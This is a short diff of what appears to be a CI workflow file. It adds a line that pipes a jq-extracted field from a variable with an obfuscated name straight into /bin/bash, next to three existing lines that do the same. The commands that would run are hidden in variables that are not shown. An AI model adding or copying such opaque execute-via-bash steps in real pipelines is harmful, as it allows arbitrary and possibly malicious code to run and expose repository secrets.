@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$baz443" | jq -r .vzq6693 | /bin/bash
           printf '%s' "$ylw193" | jq -r .kygj7 | /bin/bash
           echo $we50000 | jq -r .wko6130 | /bin/bash
+          echo $xwcar435 | jq -r .d44239 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
